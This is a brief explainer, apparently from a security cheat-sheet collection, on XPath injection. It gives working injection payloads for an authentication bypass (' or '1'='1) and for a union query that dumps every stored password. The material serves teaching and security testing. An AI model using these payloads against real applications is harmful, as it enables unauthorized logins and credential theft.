# XPath Injection

## Table of Contents

- [Authentication Bypass](#authentication-bypass)
- [Data Exfiltration](#data-exfiltration)

## Authentication Bypass

### Sign-in succeeds without valid credentials, because the injected condition is always true.

- Login bypass
    1. Query that validates credentials
        ```text
        //user[name/text()='{username}' and password/text()='{password}']
        ```

    2. Manipulated query, with `' or '1'='1` as both the username and the password
        ```text
        //user[name/text()='' or '1'='1' and password/text()='' or '1'='1']
        ```
    Every user node matches, and the service signs the attacker in as the first one, which is often an administrator.

## Data Exfiltration

### Any part of the XML document can be read, because XPath has no access control over the nodes a query returns.

- Reading other nodes through a union
    1. Query that fetches a product's price
        ```text
        //product[name/text()='{name}']/price
        ```

    2. Manipulated query, with `'] | //user/password | //x[name/text()='` as the name
        ```text
        //product[name/text()=''] | //user/password | //x[name/text()='']/price
        ```
    The response lists every password stored in the document.
